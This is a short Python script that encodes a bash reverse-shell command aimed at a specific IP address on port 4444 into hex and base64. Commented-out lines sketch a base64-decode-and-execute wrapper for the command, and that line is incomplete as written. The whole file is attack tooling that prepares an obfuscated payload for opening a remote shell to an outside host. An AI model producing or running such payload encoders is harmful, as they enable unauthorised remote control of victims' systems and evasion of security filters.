import binascii
import base64

a="bash -i >& /dev/tcp/96.63.216.161/4444 0>&1"
b=binascii.b2a_hex(a.encode())
print(b.decode())
binascii.a2b_hex(b)
# ip='96.63.216.161'
# port='4444'
# a='bash -i >& /dev/tcp/'+ip+'/'+port+' 0>&1'
# payload='bash -c {echo,'++'}|{base64,-d}|{bash,-i}'
# print(payload)
print(base64.b64encode(a.encode()).decode())